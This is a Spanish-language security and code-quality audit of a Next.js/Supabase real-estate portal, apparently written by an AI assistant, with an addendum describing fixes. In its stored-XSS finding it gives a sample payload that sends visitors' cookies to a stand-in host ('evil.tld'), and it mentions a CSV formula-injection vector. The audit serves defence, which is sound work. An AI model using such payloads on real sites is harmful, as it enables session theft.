# Auditoría Técnica — DivFlow Realty

**Fecha:** 15 de agosto de 2026
**Alcance:** Código fuente completo (`src/`), configuración de infraestructura (`middleware.ts`, `next.config.ts`), y esquema/políticas RLS reales del proyecto Supabase (`kglnrkvwqkyfxcvgncam`), verificadas por consulta directa contra `pg_policies`, no solo contra el código.
**Metodología:** Revisión estática de código + verificación cruzada de las políticas RLS reales en producción (no se asumió el contenido de las policies a partir de comentarios en el código; se consultó `pg_policies` directamente).

---

## 1. Calidad de código y mantenibilidad

### Alto
- **N+1 evitable en ficha de propiedad** — `src/app/propiedades/[slug]/page.tsx:49` (`generateMetadata`) y `:98` (`PropertyPage`) llaman a `getProperty(slug)` por separado, sin `cache()` de React. Cada vista de ficha dispara **2 llamadas RPC** (`get_property_by_slug`) en vez de 1. El patrón correcto ya existe en el propio proyecto (`get-favorite-ids.ts`, `get-amenities.ts` sí usan `cache()`), simplemente no se aplicó acá.
- **`getCurrentAgent()` sin memoizar** — `src/lib/queries/get-current-agent.ts:15`. Se invoca de forma independiente en `layout.tsx`, y de nuevo en cada página hija (`propiedades/page.tsx`, `agentes/page.tsx`, `mi-cuenta/page.tsx`, `auditoria/page.tsx`, `leads/export/route.ts`) y en varias Server Actions. Cada llamada resuelve sesión + query a `agents` desde cero — una sola carga de `/admin/propiedades` dispara como mínimo 2 resoluciones completas en el mismo request tree.

### Medio
- **Duplicación DRY confirmada:**
  - `initials(name)` triplicada: `src/app/agencias/page.tsx:15`, `src/components/admin/avatar-upload.tsx:14`, `src/app/admin/(dashboard)/layout.tsx:9` (como `agentInitials`, misma lógica).
  - `formatPrice(property)` triplicada: `property-card.tsx:15-22`, `propiedades/[slug]/page.tsx:36-43`, `comparar/page.tsx:48-55`.
  - `OPERATION_LABEL`/`TYPE_LABEL` (mapas de etiquetas en español) duplicados entre `property-card.tsx:9-13` y `comparar/page.tsx:13-26`.
  - `MAX_IMAGE_BYTES` definido en `src/lib/security/validate-image.ts` y redefinido de forma independiente en `property-image-upload.tsx:23`.
  - Ninguna está extraída a `src/lib/`, pese a que el proyecto ya tiene el patrón bien establecido para eso (`cn`, `compressImage`, `use-property-filters`).
- **`src/app/comparar/page.tsx`** es el único punto client-side que consulta Supabase directo (`createClient()` de `lib/supabase/client`) en vez de pasar por `src/lib/queries/`, rompiendo la convención de capa de datos del resto del sitio. Además resuelve en 2 queries en cascada (propiedades, después amenities) cuando un nested select lo resolvería en una.
- Server Actions con responsabilidades mezcladas (`createProperty`/`updateProperty`): auth + validación Zod + slug + persistencia + `revalidatePath`, todo en una función. Razonable a esta escala, pero sin capa de servicio intermedia si el formulario sigue creciendo.

### Bajo
- `src/components/layout/logo.tsx:25-31` — único `<Image fill>` del proyecto sin `sizes` (el resto de los usos de `fill` sí lo declaran correctamente).
- `PAGE_SIZE = 4` hardcodeado en `src/lib/queries/search-properties.ts:7`, no parametrizable.
- Un par de exports innecesarios en componentes que solo se usan dentro de su propio archivo (`skeleton.tsx`, `badge.tsx`) — no es código muerto real.

### Informativo — bien resuelto
Sin código muerto detectado en un barrido completo de `src/components`/`src/lib`. Sin restos de la migración MapTiler→Google Maps Embed. `use-property-filters.ts` es un caso ejemplar de memoización. Paginación real server-side vía RPC con `total_count` en la misma fila — sin riesgo de traer el dataset completo de una sola vez.

---

## 2. Seguridad y aspectos legales

### Crítico

**C1 — RLS de `leads` permite a cualquier agente autenticado leer, editar y borrar leads de CUALQUIER agencia, no solo los propios.**
Verificado por consulta directa a `pg_policies` en el proyecto Supabase real (no es una lectura del código, es el estado vivo de la base):

```
authenticated_read_leads    SELECT  roles={authenticated}  qual=true
authenticated_update_leads  UPDATE  roles={authenticated}  qual=true  with_check=true
authenticated_delete_leads  DELETE  roles={authenticated}  qual=true
agents_read_own_property_leads  SELECT  qual=(property_id IS NULL OR EXISTS(... a.auth_user_id = auth.uid()))
```

Existe una policy bien diseñada (`agents_read_own_property_leads`, scopeada por propiedad/agencia), pero las políticas RLS de Postgres son **permisivas por defecto (OR entre policies del mismo comando)** — al convivir con `authenticated_read_leads` (`qual = true`, sin ningún scope), esta última la anula por completo. Lo mismo pasa con UPDATE y DELETE: **no hay ninguna policy que las restrinja por agencia**.

**Impacto real:** en un portal explícitamente multi-agencia, cualquier agente de la Agencia A puede leer, marcar como atendidos, y **borrar** los leads (nombre, email, teléfono, mensaje) generados para propiedades de la Agencia B. Esto rompe la premisa central del producto (aislamiento entre agencias) y es, además, un problema de privacidad de datos: la Agencia A procesa datos personales de clientes de la Agencia B sin base legítima para hacerlo.

**C2 — Stored XSS en el JSON-LD de la ficha de propiedad, explotable contra visitantes públicos anónimos.**
`src/app/propiedades/[slug]/page.tsx:106-146`:
```tsx
const jsonLd = { ..., name: property.title, description: property.description, ... };
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```
`JSON.stringify` no escapa `<` ni `/`. `property.title`/`property.description` son texto libre (hasta 3000 caracteres, `src/lib/validation/property-form.ts`) que cualquier agente controla al crear/editar una propiedad — no hace falta ser super-agente. Un valor como `</script><script>fetch('https://evil.tld?c='+document.cookie)</script>` rompe el tag y ejecuta JS arbitrario en el navegador de **cualquier visitante público** que abra la ficha. Verificado en el archivo real (código actual, no hipotético). Agravante: `script-src` en la CSP (`middleware.ts:171`) ya incluye `'unsafe-inline'`, así que la política de headers actual no mitiga este vector en absoluto.

### Alto

- **A1 — HTML injection en el email transaccional de "tu contraseña cambió" vía header spoofeable.** `src/lib/email/send-password-changed-email.ts:57` interpola `ip` y `agentName` en el HTML del correo sin escapar. El valor de `ip` sale de `x-forwarded-for` (`mi-cuenta/actions.ts:14-17`, `reset-password/actions.ts:50-51`) — un header que el cliente controla. Cualquier agente autenticado puede forjar ese header al cambiar su propia contraseña y lograr HTML injection en el correo enviado vía Resend.
- **A2 — Server Actions de `leads` (`markLeadHandled`, `markLeadUnhandled`, `deleteLead`) y varias de `propiedades` (`deleteProperty`, `uploadPropertyImages`, `deletePropertyImage`, `setCoverImage`) no llaman a `getCurrentAgent()`/`requireSuperAgent()` — dependen 100% de RLS como única barrera. Esto agrava directamente C1: ni siquiera hay una segunda línea de defensa a nivel aplicación para el caso de `leads`. Contrasta con el patrón sí aplicado en `agentes/actions.ts`, documentado ahí mismo como "chequeo explícito además de RLS".
- **A3 — `uploadPropertyImages` no revisa el error del INSERT.** `propiedades/actions.ts:289-298`: si el insert en `property_images` falla, el archivo queda huérfano en Storage **y el contador de "subidas exitosas" se incrementa igual** — el agente ve "3 imágenes subidas" cuando una nunca quedó registrada. El flujo de avatar (`uploadAvatar`) sí maneja este caso correctamente (revierte el archivo si el UPDATE falla); este patrón no se replicó acá.
- **A4 — Salt de hash de IP con fallback hardcodeado y público.** `src/lib/security/hash-ip.ts:6`: `process.env.IP_HASH_SALT ?? "divflow-realty-dev-salt"`. Si la variable no está seteada en producción, el hash de IPs en `leads.ip_hash` es trivialmente reversible por rainbow table (espacio de IPv4 es chico), anulando el propósito de anonimización.
- **A5 — Rate limiting en memoria, no distribuido.** Confirmado: `.env.example` deja `UPSTASH_REDIS_REST_URL/TOKEN` vacías, `src/lib/security/rate-limit.ts` cae a un `Map` en memoria del proceso. En un entorno serverless/multi-instancia esto no limita nada de forma efectiva entre invocaciones distintas — login, reset de contraseña y envío de leads quedan expuestos a fuerza bruta/spam distribuido si Upstash no está realmente provisionado.

### Medio
- **M1 — CSV export sin protección de fórmula/CSV injection.** `src/app/admin/(dashboard)/leads/export/route.ts:9-13`: `csvEscape` no neutraliza celdas que empiecen con `=`, `+`, `-`, `@`. Un lead con `message` = `=HYPERLINK(...)` ejecuta fórmulas al abrir el CSV en Excel/Sheets. Sí valida sesión correctamente.
- **M2 — `public_read_agents` (RLS, `qual=true`) expone `auth_user_id` públicamente junto con el resto de columnas.** Bajo impacto real (no es secreto), pero es sobre-exposición innecesaria — bastaría con exponer solo las columnas destinadas a mostrarse en `/agencias`.

### Informativo — bien resuelto
No hay secrets hardcodeados en el código fuente (verificado por grep de patrones de claves/`service_role`). Sin inyección SQL (todo pasa por el query builder o RPC parametrizados). `validateImageFile` (magic bytes) se usa consistentemente en **ambos** flujos de upload, sin atajos. Expiración de sesión por inactividad server-side. Gate de MFA corregido y funcionando (`listFactors()` en vez del `nextLevel` bugueado del SDK). Headers de seguridad completos (HSTS, X-Frame-Options, nosniff, Permissions-Policy). Mensajes de login/reset genéricos para evitar enumeración de emails. Cierre de sesiones remotas tras cambio de contraseña. Todos los Server Actions de `agentes/actions.ts` escriben solo columnas explícitas seguras (nunca spread de `formData` crudo) — el gap de columnas de `agents_update_self` no se materializa en ningún endpoint. Las policies de `properties`, `property_images` y `property_amenities` **sí** están correctamente scopeadas por agencia/propietario (a diferencia de `leads`).

---

## 3. Rendimiento y cuellos de botella

- **`uploadPropertyImages` secuencial** (`propiedades/actions.ts:257-299`): por cada archivo hace `await upload()` y `await insert()` uno por uno — con 8-10 fotos, 16-20 round-trips en cascada a Supabase. Paralelizable con `Promise.all` para el upload y un solo `insert([...])` batcheado al final.
- **`comparar/page.tsx`**: 2 queries en cascada donde un nested select de Supabase resolvería en 1. Impacto acotado (máx. 4 propiedades comparadas), pero es la única N+1-like real fuera de la ficha de propiedad.
- Los dos puntos de N+1/doble-fetch ya cubiertos en la sección de calidad (`getProperty` duplicado, `getCurrentAgent` sin memoizar) son, en la práctica, el mayor cuello de botella de rendimiento del proyecto — no algorítmico, sino de llamadas de red redundantes por request.
- **Bien resuelto:** paginación real server-side (RPC con `total_count`), sin SDKs pesados en el bundle inicial (mapa vía iframe, sin JS de cliente), memoización correcta en filtros de búsqueda.

---

## 4. Bugs y flujos de trabajo

### Alto
- **B1 — Reset de contraseña abierto en otro dispositivo falla siempre, con mensaje engañoso.** El `code_verifier` PKCE de `resetPasswordForEmail` queda atado al navegador que hizo el pedido. Si el agente pide el reset desde la compu y abre el mail desde el celular (el caso más común en la práctica), `exchangeCodeForSession` falla y el callback muestra "el enlace venció o ya se usó" — mensaje que no corresponde a la causa real y no orienta al usuario a abrir el link en el mismo navegador/dispositivo. El agente queda en loop pidiendo enlaces sin poder resolverlo solo.
- **B2 — Bug de ciclo de vida del blob URL en `avatar-upload.tsx:41-55`.** Tras una subida exitosa, `URL.revokeObjectURL(objectUrl)` se ejecuta incondicionalmente, pero `previewUrl` solo se actualiza en la rama de error. En el camino feliz, la preview queda apuntando a un blob ya revocado hasta la próxima navegación. Regresión visual garantizada, no solo un leak potencial.

### Medio
- **B3 — Pérdida silenciosa de cambios concurrentes (last-write-wins).** `updatePropertyStatus` y `updateProperty` filtran el UPDATE solo por `id`, sin comparar contra el estado real (`status` actual o `updated_at`). Dado que RLS permite a un super-agente y al agente dueño tocar la misma fila (`super_agents_manage_all_properties` + `agents_manage_own_properties`), un escenario real (super-agente haciendo limpieza mientras el agente edita su propio listado) puede pisar cambios sin ningún aviso de conflicto.
- **B4 — Errores crudos de Postgres/PostgREST sin loguear server-side** en `propiedades/actions.ts`, `leads/actions.ts`, `agentes/actions.ts`: patrón `if (error) throw new Error(error.message)` sin `console.error` antes. No oculta el motivo al usuario (a diferencia de un bug ya corregido en `reset-password/actions.ts`), pero no deja rastro server-side para debug en producción, y el mensaje que llega es jerga de Postgres poco útil para un agente no técnico.
- **B5 — Sin `not-found.tsx` custom en todo el proyecto.** Una propiedad que pasa a pausada/archivada mientras alguien tiene el link (ej. compartido por WhatsApp) cae correctamente en `notFound()`, pero lo que se ve es el 404 default de Next, sin header/footer/link de vuelta al buscador.
- **B6 — `setCoverImage` sin atomicidad ni constraint única.** Dos UPDATEs secuenciales sin transacción, y no existe un índice único parcial que garantice una sola portada por propiedad. Bajo uso normal es inofensivo, pero accesos casi simultáneos desde dos pestañas pueden dejar 0 o 2 portadas.

### Bajo / Informativo
- Sin camino in-app para recuperar el acceso si el único super-agente pierde contraseña y dispositivo TOTP a la vez (esperable dado que Supabase TOTP no tiene backup codes nativos; mitigable exigiendo un mínimo de 2 super-agentes activos, hoy solo se bloquea la autodegradación cuando ya queda 1).
- `deleteProperty` no limpia el bucket de Storage — los archivos de imágenes quedan huérfanos indefinidamente tras el `ON DELETE CASCADE` de la fila (costo acumulado, no bloquea al usuario).

### Bien cubierto (verificado, no son hallazgos nuevos)
`/admin/agentes` y `/admin/auditoria` tienen chequeo server-side real de rol, no solo el link oculto del nav. `leads.property_id` tiene `ON DELETE SET NULL`, la UI ya maneja leads huérfanos sin romper. Doble-submit cubierto en todos los botones de mutación revisados (deshabilitados durante `isPending`). Validación Zod compartida entre cliente y servidor sin mismatch de límites.

---

## 5. Oportunidades de mejora (refactors sugeridos, no bloqueantes)

1. Extraer `initials`, `formatPrice`, `OPERATION_LABEL`/`TYPE_LABEL` y `MAX_IMAGE_BYTES` a `src/lib/` como fuente única.
2. Envolver `getProperty` y `getCurrentAgent` en `cache()` de React.
3. Migrar `comparar/page.tsx` a la capa `src/lib/queries/` con un nested select único.
4. Agregar `not-found.tsx` de marca en las rutas públicas.
5. Exigir mínimo 2 super-agentes activos en todo momento, no solo bloquear la autodegradación del último.
6. Paralelizar `uploadPropertyImages` (Storage) y batchear el insert final.

---

## Veredicto Final para Producción

### Bloqueantes Principales (deben corregirse antes de recibir tráfico real)

1. **RLS de `leads` (C1)** — cualquier agente puede leer/editar/borrar leads de cualquier agencia. Rompe el aislamiento multi-agencia y es una fuga de datos personales entre clientes del portal. Fix: reemplazar `authenticated_read_leads`/`authenticated_update_leads`/`authenticated_delete_leads` (qual=true) por policies scopeadas a la propiedad/agencia del agente, igual que ya existe correctamente en `properties`.
2. **Stored XSS en JSON-LD (C2)** — cualquier agente puede inyectar JS ejecutable contra visitantes públicos anónimos vía título/descripción de propiedad. Fix: escapar `<`/`>`/`&` en el `JSON.stringify` antes de inyectarlo, o sanear el HTML con una librería dedicada.
3. **HTML injection en email vía header spoofeable (A1)** — escapar `ip`/`agentName` antes de interpolar en el HTML del correo.
4. **Falta de defensa en profundidad en Server Actions de `leads` y varias de `propiedades` (A2)** — agregar `getCurrentAgent()`/scoping explícito, no depender solo de RLS (más urgente aún dado el punto 1).
5. **`uploadPropertyImages` sin manejo de error de insert (A3)** — puede reportar éxito falso y perder imágenes silenciosamente; afecta la integridad del catálogo que ve el público.
6. **Confirmar que Upstash está realmente provisionado en producción (A5)** — sin esto, el rate limiting de login/reset/leads no funciona en un entorno serverless multi-instancia.

### Solicitud de aprobación

Antes de tocar código, pido tu confirmación sobre el orden de trabajo: mi recomendación es arrancar por el punto 1 (RLS de leads) hoy mismo por ser el de mayor impacto de negocio y el más simple de corregir (son policies SQL, no requiere tocar código de la app), seguido del punto 2 (XSS) que es un cambio acotado a un solo archivo. Los puntos 3-6 los puedo agrupar en una segunda tanda. ¿Avanzo con el punto 1 y 2 ahora mismo, o preferís que encare los 6 juntos en una sola pasada?

### Estado de Preparación (al momento del informe): **NO LISTO**

### Recomendación Final (al momento del informe)

No recomendaba desplegar a producción en el estado en que se encontró el proyecto. Los dos hallazgos críticos eran explotables, verificados contra la base de datos real, no teóricos: uno permitía a cualquier agencia leer y borrar los contactos comerciales de sus competidoras dentro del mismo portal, y el otro permitía ejecutar JavaScript arbitrario contra cualquier visitante público del sitio. Ninguno de los dos requería privilegios especiales — alcanzaba con ser un agente normal ya dado de alta.

---

## Addendum — Corrección de los 6 bloqueantes (15/08/2026, misma jornada)

Los 6 puntos de "Bloqueantes Principales" se corrigieron sin quitar funcionalidad — se agregaron barreras y validaciones, no se removió ningún camino legítimo existente.

1. **RLS de `leads` (C1)** — corregido a nivel base de datos (migración `fix_leads_rls_scope_by_agency`). Se reemplazaron las 4 policies viejas (`authenticated_read_leads`, `authenticated_update_leads`, `authenticated_delete_leads`, `agents_read_own_property_leads`) por 2 policies `for all` scopeadas: `agents_manage_own_leads` (leads de las propiedades propias + leads generales sin `property_id`) y `super_agents_manage_all_leads`, siguiendo exactamente el mismo patrón ya usado en `properties`. Verificado con una segunda consulta directa a `pg_policies` tras aplicar el fix.
2. **Stored XSS en JSON-LD (C2)** — corregido en `src/app/propiedades/[slug]/page.tsx`: se escapa `<` a `<` en el `JSON.stringify` antes de inyectarlo, previene el escape del tag `<script>` sin alterar el JSON-LD que leen buscadores/redes.
3. **HTML injection en email (A1)** — corregido en `src/lib/email/send-password-changed-email.ts`: `ip` y `agentName` pasan por un `escapeHtml()` nuevo antes de interpolarse en el template.
4. **Defensa en profundidad en Server Actions (A2)** — `leads/actions.ts` y `propiedades/actions.ts` ahora piden `.select()` de vuelta en cada mutación y verifican filas afectadas; si RLS bloqueó la operación, se informa un error real en vez de un falso éxito. De paso quedó resuelto **B3** (last-write-wins en `updatePropertyStatus`, ahora filtra también por `status` actual y detecta conflictos de edición concurrente).
5. **`uploadPropertyImages` (A3)** — ahora revisa el error del insert en `property_images`; si falla, borra el archivo recién subido de Storage y lo reporta como error, no como éxito.
6. **Rate limiting sin Upstash (A5)** — no se cambió el comportamiento (seguir funcionando en memoria si no hay Upstash configurado seguía siendo preferible a bloquear login/reset), pero ahora loguea un `console.warn` explícito en producción si `UPSTASH_REDIS_REST_URL/TOKEN` no están seteadas, para que el gap sea visible en los logs del servidor y no silencioso.

**Extra, no listado como bloqueante pero corregido de paso por quedar en el camino:** **B6** (`setCoverImage` no atómico) — se reemplazó por una función Postgres (`set_cover_image`, `security invoker`, respeta las mismas RLS de siempre) que hace el cambio de portada en una sola sentencia atómica, y se le agregó manejo de error con toast en `property-image-manager.tsx`, que antes llamaba a esta acción sin ningún try/catch.

### Estado de Preparación (actualizado): **LISTO, sujeto a verificación de Diego**

Los 6 bloqueantes de la auditoría original están corregidos y verificados por lectura manual de cada archivo tocado (no se pudo correr `pnpm typecheck/lint/build` desde este entorno — pendiente que Diego lo corra localmente antes de dar por cerrado). Quedan los hallazgos Medio/Bajo del informe original (duplicación DRY, N+1 de `getProperty`/`getCurrentAgent`, CSV injection en export de leads, salt de IP con fallback hardcodeado, etc.) sin tocar — ninguno es bloqueante de producción, pero conviene agendarlos como siguiente tanda.
